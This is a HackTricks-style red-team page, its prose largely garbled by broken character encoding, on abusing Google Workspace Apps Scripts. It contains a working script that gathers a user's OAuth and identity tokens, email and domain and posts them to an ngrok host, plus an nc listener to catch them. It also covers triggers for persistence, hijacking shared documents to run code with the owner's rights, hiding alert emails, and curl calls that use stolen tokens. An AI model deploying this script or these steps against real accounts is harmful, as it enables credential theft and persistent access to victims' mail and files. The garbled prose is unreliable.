# GWS - App Scripts

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## App Scripts

App Scripts рд╡рд╣ **рдХреЛрдб рд╣реИ рдЬреЛ рддрдм рд╕рдХреНрд░рд┐рдп рд╣реЛрдЧрд╛ рдЬрдм рдХреЛрдИ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЬрд┐рд╕рдХреЗ рдкрд╛рд╕ рд╕рдВрдкрд╛рджрдХ рдЕрдиреБрдорддрд┐ рд╣реИ, рдЙрд╕ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рддрдХ рдкрд╣реБрдБрдЪрддрд╛ рд╣реИ рдЬрд┐рд╕рдХреЗ рд╕рд╛рде App Script рдЬреБрдбрд╝рд╛ рд╣реБрдЖ рд╣реИ** рдФрд░ **OAuth рдкреНрд░реЙрдореНрдкреНрдЯ рдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж**ред\
рдЗрдиреНрд╣реЗрдВ App Script рдХреЗ рдорд╛рд▓рд┐рдХ рджреНрд╡рд╛рд░рд╛ **рд╣рд░ рдирд┐рд╢реНрдЪрд┐рдд рд╕рдордп рдкрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рднреА рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ** (Persistence).

### Create App Script

App Script рдмрдирд╛рдиреЗ рдХреЗ рдХрдИ рддрд░реАрдХреЗ рд╣реИрдВ, рд╣рд╛рд▓рд╛рдВрдХрд┐ рд╕рдмрд╕реЗ рд╕рд╛рдорд╛рдиреНрдп рддрд░реАрдХреЗ **Google Document (рдХрд┐рд╕реА рднреА рдкреНрд░рдХрд╛рд░ рдХрд╛)** рд╕реЗ рдФрд░ **рд╕реНрд╡рддрдВрддреНрд░ рдкрд░рд┐рдпреЛрдЬрдирд╛** рдХреЗ рд░реВрдк рдореЗрдВ рд╣реИрдВ:

<details>

<summary>Create a container-bound project from Google Docs, Sheets, or Slides</summary>

1. рдПрдХ Docs рджрд╕реНрддрд╛рд╡реЗрдЬрд╝, рдПрдХ Sheets рд╕реНрдкреНрд░реЗрдбрд╢реАрдЯ, рдпрд╛ Slides рдкреНрд░рд╕реНрддреБрддрд┐ рдЦреЛрд▓реЗрдВред
2. **Extensions** > **Google Apps Script** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред
3. рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╕рдВрдкрд╛рджрдХ рдореЗрдВ, **Untitled project** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред
4. рдЕрдкрдиреЗ рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдХрд╛ рдирд╛рдо рджреЗрдВ рдФрд░ **Rename** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред

</details>

<details>

<summary>Create a standalone project</summary>

Apps Script рд╕реЗ рдПрдХ рд╕реНрд╡рддрдВрддреНрд░ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП:

1. [`script.google.com`](https://script.google.com/) рдкрд░ рдЬрд╛рдПрдВред
2. **New Project** рдЬреЛрдбрд╝реЗрдВ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред
3. рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╕рдВрдкрд╛рджрдХ рдореЗрдВ, **Untitled project** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред
4. рдЕрдкрдиреЗ рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдХрд╛ рдирд╛рдо рджреЗрдВ рдФрд░ **Rename** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред

</details>

<details>

<summary>Create a standalone project from Google Drive</summary>

1. [Google Drive](https://drive.google.com/) рдЦреЛрд▓реЗрдВред
2. **New** > **More** > **Google Apps Script** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред

</details>

<details>

<summary>Create a container-bound project from Google Forms</summary>

1. Google Forms рдореЗрдВ рдПрдХ рдлреЙрд░реНрдо рдЦреЛрд▓реЗрдВред
2. More more\_vert > **Script editor** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред
3. рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╕рдВрдкрд╛рджрдХ рдореЗрдВ, **Untitled project** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред
4. рдЕрдкрдиреЗ рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдХрд╛ рдирд╛рдо рджреЗрдВ рдФрд░ **Rename** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред

</details>

<details>

<summary>Create a standalone project using the clasp command line tool</summary>

`clasp` рдПрдХ рдХрдорд╛рдВрдб рд▓рд╛рдЗрди рдЯреВрд▓ рд╣реИ рдЬреЛ рдЖрдкрдХреЛ рдЯрд░реНрдорд┐рдирд▓ рд╕реЗ Apps Script рдкрд░рд┐рдпреЛрдЬрдирд╛рдПрдБ рдмрдирд╛рдиреЗ, рдЦреАрдВрдЪрдиреЗ/рдзрдХреЗрд▓рдиреЗ рдФрд░ рддреИрдирд╛рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред

рдЕрдзрд┐рдХ рд╡рд┐рд╡рд░рдг рдХреЗ рд▓рд┐рдП [Command Line Interface using `clasp` guide](https://developers.google.com/apps-script/guides/clasp) рджреЗрдЦреЗрдВред

</details>

## App Script Scenario <a href="#create-using-clasp" id="create-using-clasp"></a>

### Create Google Sheet with App Script

рдПрдХ App Script рдмрдирд╛рдиреЗ рд╕реЗ рд╢реБрд░реВ рдХрд░реЗрдВ, рдЗрд╕ рдкрд░рд┐рджреГрд╢реНрдп рдХреЗ рд▓рд┐рдП рдореЗрд░реА рд╕рд┐рдлрд╛рд░рд┐рд╢ рд╣реИ рдХрд┐ рдПрдХ Google Sheet рдмрдирд╛рдПрдВ рдФрд░ **`Extensions > App Scripts`** рдкрд░ рдЬрд╛рдПрдВ, рдЗрд╕рд╕реЗ рдЖрдкрдХреЗ рд▓рд┐рдП **рд╢реАрдЯ рд╕реЗ рдЬреБрдбрд╝рд╛ рдПрдХ рдирдпрд╛ App Script рдЦреБрд▓реЗрдЧрд╛**ред

### Leak token

OAuth рдЯреЛрдХрди рдХреЛ рдПрдХреНрд╕реЗрд╕ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ **`Services +` рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдФрд░ рд╕реНрдХреЛрдк рдЬреЛрдбрд╝рдирд╛ рд╣реЛрдЧрд╛ рдЬреИрд╕реЗ**:

* **AdminDirectory**: рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдФрд░ рд╕рдореВрд╣реЛрдВ рддрдХ рдкрд╣реБрдБрдЪ (рдпрджрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкрд╛рд╕ рдкрд░реНрдпрд╛рдкреНрдд рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реИрдВ)
* **Gmail**: рдЬреАрдореЗрд▓ рдбреЗрдЯрд╛ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреЗ рд▓рд┐рдП
* **Drive**: рдбреНрд░рд╛рдЗрд╡ рдбреЗрдЯрд╛ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреЗ рд▓рд┐рдП
* **Google Sheets API**: рддрд╛рдХрд┐ рдпрд╣ рдЯреНрд░рд┐рдЧрд░ рдХреЗ рд╕рд╛рде рдХрд╛рдо рдХрд░реЗ

рдЕрдкрдиреЗ рд▓рд┐рдП **рдЖрд╡рд╢реНрдпрдХ рд╕реНрдХреЛрдк** рдмрджрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдкреНрд░реЛрдЬреЗрдХреНрдЯ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдкрд░ рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╕рдХреНрд╖рдо рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: **`Show "appsscript.json" manifest file in editor`.**

{% code overflow="wrap" %}
```javascript
function getToken() {
var userEmail = Session.getActiveUser().getEmail();
var domain = userEmail.substring(userEmail.lastIndexOf("@") + 1);
var oauthToken = ScriptApp.getOAuthToken();
var identityToken = ScriptApp.getIdentityToken();

// Data json
data = {
"oauthToken": oauthToken,
"identityToken": identityToken,
"email": userEmail,
"domain": domain
}

// Send data
makePostRequest(data);

// Use the APIs, if you don't even if the have configured them in appscript.json the App script won't ask for permissions

// To ask for AdminDirectory permissions
var pageToken = "";
page = AdminDirectory.Users.list({
domain: domain,  // Use the extracted domain
orderBy: 'givenName',
maxResults: 100,
pageToken: pageToken
});

// To ask for gmail permissions
var threads = GmailApp.getInboxThreads(0, 10);

// To ask for drive permissions
var files = DriveApp.getFiles();
}


function makePostRequest(data) {
var url = 'http://5.tcp.eu.ngrok.io:12027';

var options = {
'method' : 'post',
'contentType': 'application/json',
'payload' : JSON.stringify(data)
};

try {
UrlFetchApp.fetch(url, options);
} catch (e) {
Logger.log("Error making POST request: " + e.toString());
}
}
```
{% endcode %}

рдЕрдиреБрд░реЛрдз рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдмрд╕ рдпрд╣ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
ngrok tcp 4444
nc -lv 4444 #macOS
```
Permissions requested to execute the App Script:

<figure><img src="../../../.gitbook/assets/image (334).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
рдЬрдм рдПрдХ рдмрд╛рд╣рд░реА рдЕрдиреБрд░реЛрдз рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ OAuth рдкреНрд░реЙрдореНрдкреНрдЯ рднреА **рдмрд╛рд╣рд░реА рдПрдВрдбрдкреЙрдЗрдВрдЯреНрд╕ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐** рдорд╛рдВрдЧреЗрдЧрд╛ред
{% endhint %}

### Create Trigger

рдПрдХ рдмрд╛рд░ рдЬрдм рдРрдк рдкрдврд╝ рд▓рд┐рдпрд╛ рдЬрд╛рдП, рддреЛ **тП░ рдЯреНрд░рд┐рдЧрд░реНрд╕** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ рддрд╛рдХрд┐ рдПрдХ рдЯреНрд░рд┐рдЧрд░ рдмрдирд╛рдпрд╛ рдЬрд╛ рд╕рдХреЗред **рдлрдВрдХреНрд╢рди** рдХреЗ рд▓рд┐рдП **`getToken`** рдЪреБрдиреЗрдВ, рдЬреЛ рддреИрдирд╛рддреА рдкрд░ **`Head`** рдкрд░ рдЪрд▓рддрд╛ рд╣реИ, рдЗрд╡реЗрдВрдЯ рд╕реНрд░реЛрдд рдореЗрдВ **`From spreadsheet`** рдЪреБрдиреЗрдВ рдФрд░ рдЗрд╡реЗрдВрдЯ рдкреНрд░рдХрд╛рд░ рдореЗрдВ **`On open`** рдпрд╛ **`On edit`** (рдЖрдкрдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛рдУрдВ рдХреЗ рдЕрдиреБрд╕рд╛рд░) рдЪреБрдиреЗрдВ рдФрд░ рд╕рд╣реЗрдЬреЗрдВред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЖрдк **рдПрдХреНрдЬреАрдХреНрдпреВрд╢рдВрд╕ рдЯреИрдм рдореЗрдВ рдРрдк рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рд░рди** рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрджрд┐ рдЖрдк рдХреБрдЫ рдбрд┐рдмрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВред

### Sharing

**рдЯреНрд░рд┐рдЧрд░** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдРрдк рд╕реНрдХреНрд░рд┐рдкреНрдЯ**, рдкреАрдбрд╝рд┐рдд рдХреЛ **рдПрдбрд┐рдЯрд░ рдПрдХреНрд╕реЗрд╕** рдХреЗ рд╕рд╛рде рдХрдиреЗрдХреНрдЯ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред

{% hint style="success" %}
**рдРрдк рд╕реНрдХреНрд░рд┐рдкреНрдЯ** рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ **рдЯреЛрдХрди** **рдЯреНрд░рд┐рдЧрд░ рдХреЗ рдирд┐рд░реНрдорд╛рддрд╛** рдХрд╛ рд╣реЛрдЧрд╛, рднрд▓реЗ рд╣реА рдлрд╝рд╛рдЗрд▓ рдХреЛ рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рджреНрд╡рд╛рд░рд╛ рдПрдбрд┐рдЯрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдЦреЛрд▓рд╛ рдЧрдпрд╛ рд╣реЛред
{% endhint %}

### Abusing Shared With Me documents

{% hint style="danger" %}
рдпрджрд┐ рдХрд┐рд╕реА рдиреЗ **рдЖрдкрдХреЗ рд╕рд╛рде рдПрдХ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рд╕рд╛рдЭрд╛ рдХрд┐рдпрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдРрдк рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдФрд░ рдЯреНрд░рд┐рдЧрд░ рд╣реИ рдЬреЛ рдРрдк рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рд╣реЗрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ** (рдирд┐рд╢реНрдЪрд┐рдд рддреИрдирд╛рддреА рдирд╣реАрдВ), рддреЛ рдЖрдк рдРрдк рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛрдб рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдЪреБрд░рд╛рдиреЗ рд╡рд╛рд▓реЗ рдЯреЛрдХрди рдлрд╝рдВрдХреНрд╢рди рдЬреЛрдбрд╝рдирд╛), рдЗрд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ **рдРрдк рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЙрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдЧреА рдЬрд┐рд╕рдиреЗ рдЖрдкрдХреЗ рд╕рд╛рде рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рд╕рд╛рдЭрд╛ рдХрд┐рдпрд╛**! (рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдорд╛рд▓рд┐рдХ рдХрд╛ OAuth рдЯреЛрдХрди рдЯреНрд░рд┐рдЧрд░ рдмрдирд╛рдП рдЬрд╛рдиреЗ рдкрд░ рджрд┐рдП рдЧрдП рдПрдХреНрд╕реЗрд╕ рд╕реНрдХреЛрдк рдХреЗ рд░реВрдк рдореЗрдВ рд╣реЛрдЧрд╛)ред

**рдПрдХ рдЕрдзрд┐рд╕реВрдЪрдирд╛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рдирд┐рд░реНрдорд╛рддрд╛ рдХреЛ рднреЗрдЬреА рдЬрд╛рдПрдЧреА рдЬрд┐рд╕рдореЗрдВ рд╕рдВрдХреЗрдд рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдХрд┐ рдХрд┐рд╕реА рдиреЗ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рд╣реИ** (рдХреНрдпрд╛ рдЬреАрдореЗрд▓ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрд▓рд░реНрдЯ рдХреЛ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдлрд╝рд┐рд▓реНрдЯрд░ рдмрдирд╛рдиреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ?) 
{% endhint %}

{% hint style="success" %}
рдпрджрд┐ рдПрдХ **рд╣рдорд▓рд╛рд╡рд░ рдРрдк рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рд╕реНрдХреЛрдк рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рддрд╛ рд╣реИ**, рддреЛ рдЕрдкрдбреЗрдЯ **рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдкрд░ рд▓рд╛рдЧреВ рдирд╣реАрдВ рд╣реЛрдВрдЧреЗ** рдЬрдм рддрдХ рдХрд┐ рдПрдХ **рдирдпрд╛ рдЯреНрд░рд┐рдЧрд░** рдкрд░рд┐рд╡рд░реНрддрдиреЛрдВ рдХреЗ рд╕рд╛рде рдирд╣реАрдВ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ред рдЗрд╕рд▓рд┐рдП, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЯреНрд░рд┐рдЧрд░ рдореЗрдВ рд╕реЗрдЯ рдХрд┐рдП рдЧрдП рд╕реНрдХреЛрдк рд╕реЗ рдЕрдзрд┐рдХ рд╕реНрдХреЛрдк рдХреЗ рд╕рд╛рде рдорд╛рд▓рд┐рдХ рдХреЗ рдирд┐рд░реНрдорд╛рддрд╛ рдЯреЛрдХрди рдХреЛ рдЪреБрд░рд╛рдиреЗ рдореЗрдВ рдЕрд╕рдорд░реНрде рд╣реЛрдЧрд╛ред
{% endhint %}

### Copying instead of sharing

рдЬрдм рдЖрдк рдПрдХ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рд╕рд╛рдЭрд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд▓рд┐рдВрдХ рдмрдирд╛рддреЗ рд╣реИрдВ, рддреЛ рдПрдХ рд▓рд┐рдВрдХ рдЗрд╕ рддрд░рд╣ рдХрд╛ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ: `https://docs.google.com/spreadsheets/d/1i5[...]aIUD/edit`\
рдпрджрд┐ рдЖрдк **"/edit"** рдХреЗ рдЕрдВрдд рдХреЛ **"/copy"** рдореЗрдВ **рдмрджрд▓рддреЗ рд╣реИрдВ**, рддреЛ рдЧреВрдЧрд▓ рдЖрдкрдХреЛ рдкреВрдЫреЗрдЧрд╛ рдХрд┐ рдХреНрдпрд╛ рдЖрдк **рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреА рдПрдХ рдкреНрд░рддрд┐ рдЙрддреНрдкрдиреНрди рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ:**

<figure><img src="../../../.gitbook/assets/image (335).png" alt=""><figcaption></figcaption></figure>

рдпрджрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрд╕реЗ рдХреЙрдкреА рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд░рддрд╛ рд╣реИ, рддреЛ **рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреА рд╕рд╛рдордЧреНрд░реА рдФрд░ рдРрдк рд╕реНрдХреНрд░рд┐рдкреНрдЯ рджреЛрдиреЛрдВ рдХреЙрдкреА рдХреА рдЬрд╛рдПрдВрдЧреА**, рд╣рд╛рд▓рд╛рдБрдХрд┐ **рдЯреНрд░рд┐рдЧрд░ рдирд╣реАрдВ рд╣реЛрдВрдЧреЗ**, рдЗрд╕рд▓рд┐рдП **рдХреБрдЫ рднреА рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдирд╣реАрдВ рд╣реЛрдЧрд╛**ред

### Sharing as Web Application

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **рдРрдк рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдПрдХ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рд░реВрдк рдореЗрдВ рд╕рд╛рдЭрд╛ рдХрд░рдирд╛ рднреА рд╕рдВрднрд╡ рд╣реИ** (рдРрдк рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рд╕рдВрдкрд╛рджрдХ рдореЗрдВ, рдПрдХ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рд░реВрдк рдореЗрдВ рддреИрдирд╛рдд рдХрд░реЗрдВ), рд▓реЗрдХрд┐рди рдЗрд╕ рддрд░рд╣ рдХрд╛ рдПрдХ рдЕрд▓рд░реНрдЯ рджрд┐рдЦрд╛рдИ рджреЗрдЧрд╛:

<figure><img src="../../../.gitbook/assets/image (337).png" alt=""><figcaption></figcaption></figure>

рдЗрд╕рдХреЗ рдмрд╛рдж рдЖрд╡рд╢реНрдпрдХ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП **рд╡рд┐рд╢рд┐рд╖реНрдЯ OAuth рдкреНрд░реЙрдореНрдкреНрдЯ** рдЖрдПрдЧрд╛ред

### Testing

рдЖрдк рдПрдХ рдПрдХрддреНрд░рд┐рдд рдЯреЛрдХрди рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдИрдореЗрд▓ рд╕реВрдЪреАрдмрджреНрдз рдХрд░ рд╕рдХреЗрдВ:

{% code overflow="wrap" %}
```bash
curl -X GET "https://www.googleapis.com/gmail/v1/users/<user@email>/messages" \
-H "Authorization: Bearer <token>"
```
{% endcode %}

рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдХреИрд▓реЗрдВрдбрд░ рд╕реВрдЪреАрдмрджреНрдз рдХрд░реЗрдВ:
```bash
curl -H "Authorization: Bearer $OAUTH_TOKEN" \
-H "Accept: application/json" \
"https://www.googleapis.com/calendar/v3/users/me/calendarList"
```
## App Script рдХреЗ рд░реВрдк рдореЗрдВ рд╕реНрдерд┐рд░рддрд╛

рд╕реНрдерд┐рд░рддрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рд╡рд┐рдХрд▓реНрдк рд╣реЛрдЧрд╛ **рдПрдХ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдмрдирд╛рдирд╛ рдФрд░ getToken** рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рдПрдХ рдЯреНрд░рд┐рдЧрд░ рдЬреЛрдбрд╝рдирд╛ рдФрд░ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреЛ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд╕рд╛рде рд╕рд╛рдЭрд╛ рдХрд░рдирд╛ рддрд╛рдХрд┐ рд╣рд░ рдмрд╛рд░ рдЬрдм рд╣рдорд▓рд╛рд╡рд░ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдЦреЛрд▓реЗ, рд╡рд╣ **рдкреАрдбрд╝рд┐рдд рдХрд╛ рдЯреЛрдХрди рдирд┐рдХрд╛рд▓ рд╕рдХреЗред**

рдпрд╣ рднреА рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдПрдХ App Script рдмрдирд╛рдИ рдЬрд╛рдП рдФрд░ рдЗрд╕реЗ рд╣рд░ X рд╕рдордп (рдЬреИрд╕реЗ рд╣рд░ рдорд┐рдирдЯ, рдШрдВрдЯреЗ, рджрд┐рди...) рдЯреНрд░рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛рдПред рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЬрд┐рд╕рдиреЗ **рдкреАрдбрд╝рд┐рдд рдХреЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдпрд╛ рд╕рддреНрд░ рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд┐рдпрд╛ рд╣реИ, рд╡рд╣ рдПрдХ App Script рд╕рдордп рдЯреНрд░рд┐рдЧрд░ рд╕реЗрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рд╣рд░ рджрд┐рди рдПрдХ рдмрд╣реБрдд рд╣реА рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд OAuth рдЯреЛрдХрди рд▓реАрдХ рдХрд░ рд╕рдХрддрд╛ рд╣реИ**:

рдмрд╕ рдПрдХ App Script рдмрдирд╛рдПрдВ, рдЯреНрд░рд┐рдЧрд░реНрд╕ рдкрд░ рдЬрд╛рдПрдВ, Add Trigger рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ, рдФрд░ рдШрдЯрдирд╛ рд╕реНрд░реЛрдд рдХреЗ рд░реВрдк рдореЗрдВ Time-driven рдЪреБрдиреЗрдВ рдФрд░ рдЙрди рд╡рд┐рдХрд▓реНрдкреЛрдВ рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ рдЬреЛ рдЖрдкрдХреЗ рд▓рд┐рдП рд╕рдмрд╕реЗ рдЙрдкрдпреБрдХреНрдд рд╣реИрдВ:

<figure><img src="../../../.gitbook/assets/image (336).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
рдпрд╣ рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рдЕрд▓рд░реНрдЯ рдИрдореЗрд▓ рдФрд░ рдЖрдкрдХреЗ рдореЛрдмрд╛рдЗрд▓ рдкрд░ рдЗрд╕ рдмрд╛рд░реЗ рдореЗрдВ рдПрдХ рдкреБрд╢ рд╕рдВрджреЗрд╢ рдмрдирд╛рдПрдЧрд╛ред
{% endhint %}

### рд╕рд╛рдЭрд╛ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдЕрдирд╡реЗрд░рд┐рдлрд╛рдЗрдб рдкреНрд░реЙрдореНрдкреНрдЯ рдмрд╛рдпрдкрд╛рд╕

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдпрджрд┐ рдХрд┐рд╕реА рдиреЗ рдЖрдкрдХреЗ рд╕рд╛рде **рд╕рдВрдкрд╛рджрдХ рдкрд╣реБрдВрдЪ** рдХреЗ рд╕рд╛рде рдПрдХ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ **рд╕рд╛рдЭрд╛** рдХрд┐рдпрд╛ рд╣реИ, рддреЛ рдЖрдк **рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреЗ рдЕрдВрджрд░ App Scripts рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ **рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХрд╛ OWNER (рдирд┐рд░реНрдорд╛рддрд╛) App Script рдХрд╛ рдорд╛рд▓рд┐рдХ рд╣реЛрдЧрд╛**ред

{% hint style="warning" %}
